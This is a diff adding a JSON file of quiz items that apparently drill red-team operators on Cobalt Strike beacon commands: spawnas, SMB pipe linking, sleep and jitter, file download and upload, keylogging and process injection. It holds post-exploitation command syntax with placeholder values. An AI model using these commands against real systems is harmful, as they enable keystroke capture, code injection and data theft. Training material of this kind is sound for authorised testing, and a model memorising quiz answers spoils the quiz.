@@ -1,0 +1,73 @@
+﻿[
+    {
+        "question":  [
+                         "What Cobalt Strike command will \"spawnas\" to the listener https_443?",
+                         "Username = <user>",
+                         "Password = <pass>"
+                     ],
+        "answer":  "spawnas <user> <pass> https_443"
+    },
+    {
+        "question":  [
+                         "What Cobalt Strike command will link an SMB beacon to the listed named pipe?",
+                         "IP Address = <IP>",
+                         "Named Pipe = <pipe>"
+                     ],
+        "answer":  "link <IP> <pipe>"
+    },
+    {
+        "question":  [
+                         "What Cobalt Strike command will set sleep, in seconds, and jitter",
+                         "Example = sleep X X",
+                         "Sleep = <sleep> minutes",
+                         "jitter = <jitter>%"
+                     ],
+        "answer":  "sleep <sleep_seconds> <jitter>",
+        "alternate_answers":  [
+                                  "sleep <sleep>m <jitter>j"
+                              ]
+    },
+    {
+        "question":  [
+                         "You\u0027ve just killed a beacon, what command change the note field to \"zzzDEAD\"?"
+                     ],
+        "answer":  "note zzzDEAD"
+    },
+    {
+        "question":  [
+                         "How would you download a file through a beacon?",
+                         "File = <exfil>"
+                     ],
+        "answer":  "download <exfil>"
+    },
+    {
+        "question":  [
+                         "How would you upload a file through a beacon?",
+                         "File = <payload>"
+                     ],
+        "answer":  "upload <payload>"
+    },
+    {
+        "question":  [
+                         "How would you start keylogging on a x64 beacon?",
+                         "pid = <pid>"
+                     ],
+        "answer":  "keylogger <pid> start x64"
+    },
+    {
+        "question":  [
+                         "How would you stop keylogging on a x64 beacon?",
+                         "pid = <pid>"
+                     ],
+        "answer":  "keylogger <pid> stop x64"
+    },
+    {
+        "question":  [
+                         "How would you inject into a new process with a beacon?",
+                         "PID = <pid>",
+                         "Listener = <listener>"
+                     ],
+        "answer":  "inject <pid> x64 <listener>"
+    }
+]
+
